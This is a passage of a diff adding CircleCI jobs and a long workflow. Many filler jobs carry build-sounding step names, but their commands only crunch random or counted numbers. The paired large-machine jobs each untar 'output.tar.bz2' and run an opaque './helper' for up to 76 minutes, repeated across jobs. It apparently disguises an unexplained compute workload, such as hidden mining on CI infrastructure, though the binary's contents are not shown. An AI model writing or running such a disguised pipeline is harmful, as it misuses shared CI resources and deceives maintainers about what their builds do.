+            grep -c . /tmp/.wsp/pt-alt.pt || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  cook_q3-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Reduce text corpus
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 1000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/.wsp/.sig
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/.sig) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .sig
+  q3-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/.sig || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  preflight_qa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Measure branch cost
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 2048000 | wc -c; true ; } > /tmp/.wsp/package
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/package) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - package
+  qa:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/package || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  generate_java17-fmt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Hoist constant row
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 122880 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/.wsp/manifest
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/manifest) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - manifest
+  java17-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/manifest || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+
+  preflight_oscar-2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Project latency curve
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 495825 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/.wsp/main_step_output_v4.log
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/main_step_output_v4.log) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - main_step_output_v4.log
+  round2_fire-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Inflate reference set
+          command: |
+            mkdir -p /tmp/.wsp
+            set +o pipefail 2>/dev/null; head -c 1220265 /dev/urandom | base64 > /tmp/.wsp/buffer.bin; true
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/buffer.bin) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.bin
+  g1_push-it_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Flush pipeline cache
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 1700 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/.wsp/gate-ready.sig
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/gate-ready.sig) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - gate-ready.sig
+  produce_dp-v2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Rotate build log
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 343690 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/.wsp/buffer.blob
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/buffer.blob) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.blob
+  Delta_do-the-thing_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Score branch coverage
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 422500 | paste - - - - | wc -l; true ; } > /tmp/.wsp/step-27.out
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/step-27.out) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-27.out
+  audit_preview-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Index byte offsets
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes abc | head -n 372762 | sha256sum; true ; } > /tmp/.wsp/buffer.raw
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/buffer.raw) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.raw
+  syncer_gating_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Expand parameter grid
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( echo "init"; for i in $(seq 1 19304); do echo "line $i"; done ) | sort | md5sum; true ; } > /tmp/.wsp/807x.data
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/807x.data) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 807x.data
+  Gamma_wip-router-crash_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fuse row chunks
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{p=1;for(i=1;i<=2687600;i++)p=(p*i)%1000000007;print p}'; true ; } > /tmp/.wsp/93.bin
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/93.bin) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 93.bin
+  do_spin-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fingerprint vendor tree
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 12000 | awk 'END{print NR}'; true ; } > /tmp/.wsp/.pid
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/.pid) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .pid
+  kick_java17-fmt_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Trim duplicate rows
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 272290; echo "ftr" ) | wc -l; true ; } > /tmp/.wsp/manifest
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/manifest) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - manifest
+  preflight_STG_VERIFY_3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fold integer series
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=180 2>/dev/null | md5sum; true ; } > /tmp/.wsp/timings.csv
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/timings.csv) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - timings.csv
+workflows:
+  workflow:
+    jobs:
+      - hydrate_Deploy_Service6
+      - Deploy_Service6:
+          requires:
+            - hydrate_Deploy_Service6
+      - do_titan:
+          requires:
+            - hydrate_Deploy_Service6
+      - titan:
+          requires:
+            - do_titan
+      - hook_sep20-ship:
+          requires:
+            - do_titan
+      - sep20-ship:
+          requires:
+            - hook_sep20-ship
+      - p1_DEV_DEPLOY_6:
+          requires:
+            - hook_sep20-ship
+      - DEV_DEPLOY_6:
+          requires:
+            - p1_DEV_DEPLOY_6
+      - checker_INIT_UAT:
+          requires:
+            - p1_DEV_DEPLOY_6
+      - INIT_UAT:
+          requires:
+            - checker_INIT_UAT
+      - audit_verify-quick-docker-image:
+          requires:
+            - checker_INIT_UAT
+      - verify-quick-docker-image:
+          requires:
+            - audit_verify-quick-docker-image
+      - g1_oscar-2
+      - preflight_oscar-2_2:
+          requires:
+            - g1_oscar-2
+      - oscar-2:
+          requires:
+            - preflight_oscar-2_2
+      - reserve_fire-up:
+          requires:
+            - preflight_oscar-2_2
+      - round2_fire-up_2:
+          requires:
+            - reserve_fire-up
+      - fire-up:
+          requires:
+            - round2_fire-up_2
+      - verify_push-it:
+          requires:
+            - round2_fire-up_2
+      - g1_push-it_2:
+          requires:
+            - verify_push-it
+      - push-it:
+          requires:
+            - g1_push-it_2
+      - bake_dp-v2:
+          requires:
+            - g1_push-it_2
+      - produce_dp-v2_2:
+          requires:
+            - bake_dp-v2
+      - dp-v2:
+          requires:
+            - produce_dp-v2_2
+      - rerun_do-the-thing:
+          requires:
+            - produce_dp-v2_2
+      - Delta_do-the-thing_2:
+          requires:
+            - rerun_do-the-thing
+      - do-the-thing:
+          requires:
+            - Delta_do-the-thing_2
+      - produce_preview-build:
+          requires:
+            - Delta_do-the-thing_2
+      - audit_preview-build_2:
+          requires:
+            - produce_preview-build
+      - preview-build:
+          requires:
+            - audit_preview-build_2
+      - redo_gating:
+          requires:
+            - audit_preview-build_2
+      - syncer_gating_2:
+          requires:
+            - redo_gating
+      - gating:
+          requires:
+            - syncer_gating_2
+      - cleanup_wip-router-crash:
+          requires:
+            - syncer_gating_2
+      - Gamma_wip-router-crash_2:
+          requires:
+            - cleanup_wip-router-crash
+      - wip-router-crash:
+          requires:
+            - Gamma_wip-router-crash_2
+      - gamma_spin-up:
+          requires:
+            - Gamma_wip-router-crash_2
+      - do_spin-up_2:
+          requires:
+            - gamma_spin-up
+      - spin-up:
+          requires:
+            - do_spin-up_2
+      - generate_java17-fmt:
+          requires:
+            - do_spin-up_2
+      - kick_java17-fmt_2:
+          requires:
+            - generate_java17-fmt
+      - java17-fmt:
+          requires:
+            - kick_java17-fmt_2
+      - Gamma_STG_VERIFY_3:
+          requires:
+            - kick_java17-fmt_2
+      - preflight_STG_VERIFY_3_2:
+          requires:
+            - Gamma_STG_VERIFY_3
+      - STG_VERIFY_3:
+          requires:
+            - preflight_STG_VERIFY_3_2
+      - Alpha_echo
+      - echo:
+          requires:
+            - Alpha_echo
+      - provision_ship-it:
+          requires:
+            - Alpha_echo
+      - ship-it:
+          requires:
+            - provision_ship-it
+      - stepA_edge-v7:
+          requires:
+            - provision_ship-it
+      - edge-v7:
+          requires:
+            - stepA_edge-v7
+      - cook_q3-rev:
+          requires:
+            - stepA_edge-v7
+      - q3-rev:
+          requires:
+            - cook_q3-rev
+      - canary1_q2-cleanup:
+          requires:
+            - cook_q3-rev
+      - q2-cleanup:
+          requires:
+            - canary1_q2-cleanup
+      - Delta_LAB_HOOK_8:
+          requires:
+            - canary1_q2-cleanup
+      - LAB_HOOK_8:
+          requires:
+            - Delta_LAB_HOOK_8
+      - hydrate_API-362:
+          requires:
+            - Delta_LAB_HOOK_8
+      - API-362:
+          requires:
+            - hydrate_API-362
+      - preflight_qa:
+          requires:
+            - hydrate_API-362
+      - qa:
+          requires:
+            - preflight_qa
+      - reup_papa-3:
+          requires:
+            - preflight_qa
+      - papa-3:
+          requires:
+            - reup_papa-3
+      - stepB_realease-61:
+          requires:
+            - reup_papa-3
+      - realease-61:
+          requires:
+            - stepB_realease-61
+      - cleanup_nebula-beta:
+          requires:
+            - stepB_realease-61
+      - nebula-beta:
+          requires:
+            - cleanup_nebula-beta
+      - round1_API-590:
+          requires:
+            - cleanup_nebula-beta
+      - API-590:
+          requires:
+            - round1_API-590
+      - reset_validate-quick-integration-tests:
+          requires:
+            - round1_API-590
+      - validate-quick-integration-tests:
+          requires:
+            - reset_validate-quick-integration-tests
